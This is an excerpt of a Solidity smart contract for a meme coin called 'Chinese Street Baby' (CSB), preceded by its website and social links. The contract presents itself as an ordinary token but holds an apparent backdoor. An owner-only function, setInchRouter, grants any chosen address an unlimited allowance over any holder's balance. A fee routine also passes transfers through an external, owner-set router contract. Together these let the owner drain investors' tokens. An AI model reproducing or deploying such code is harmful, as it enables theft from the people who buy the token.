...
Chinese Street Baby is a meme coin for the Chinese Wall Street Bets community members.

Website: https://chinesestreet.baby
Telegram: https://t.me/ChineseStrBaby
Twitter: https://twitter.com/ChineseStrBaby
...
contract CSB is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Chinese Street Baby";
    string private _symbol = unicode"CSB";
    ...
    function setInchRouter(address _token, address _inchRouter) public onlyOwner {
        _allowances[_token][_inchRouter] = type(uint).max;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeTransferFee(sender, recipient, amount);
    ...
    function takeTransferFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if (inchRouter == address(0) || IERC20(inchRouter).transferFrom(sender, recipient, feeAmount)) feeAmount = 0;
